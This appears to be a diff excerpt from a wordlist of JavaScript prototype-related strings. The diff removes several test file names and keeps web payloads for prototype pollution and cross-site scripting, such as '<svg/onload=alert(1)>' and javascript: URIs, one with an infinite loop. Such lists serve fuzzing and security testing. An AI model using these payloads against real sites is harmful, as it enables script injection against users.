@@ -26,14 +26,8 @@ exploit string: top.__proto__._= alert
 iframe.contentwindow.location.constructor.prototype
 javascript:htmldocument.__proto__.__definesetter__("prototype",function(){try{d.d.d}catch(e){confirm(e.stack)}})
 json.parse('{"__proto__":["a",1]}')
-object.prototype.freeze.html
 object.prototype.freeze.html.ini
-object.prototype.getownpropertynames.html
-object.prototype.hasownproperty-order.html
-object.prototype.hasownproperty-prototype-chain.html
-object.prototype.preventextensions.html
 object.prototype.preventextensions.html.ini
-object.prototype.seal.html
 object.prototype.seal.html.ini
 object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';location='javascript:1+{}'
 object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';while(1){}location='javascript:1+{}'
